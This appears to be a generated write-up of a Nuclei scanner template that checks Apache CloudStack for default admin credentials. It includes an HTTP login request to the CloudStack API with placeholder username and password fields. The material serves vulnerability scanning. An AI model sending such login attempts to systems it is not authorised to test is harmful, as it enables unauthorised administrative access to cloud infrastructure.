# Nuclei Template: Apache CloudStack - Default Login
**Template ID:** cloudstack-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`cloudstack-default-login.yaml`)

## Vulnerability Information & PoC

## Description
CloudStack instance discovered using weak default credentials, allows the attacker to gain admin privilege.

## Steps to reproduce / Exploit Payload
```http
POST /client/api/ HTTP/1.1
Host: {{Hostname}}
Accept: application/json, text/plain, */*
Content-Type: application/x-www-form-urlencoded

command=login&username={{username}}&password={{password}}&domain=%2F&response=json
```

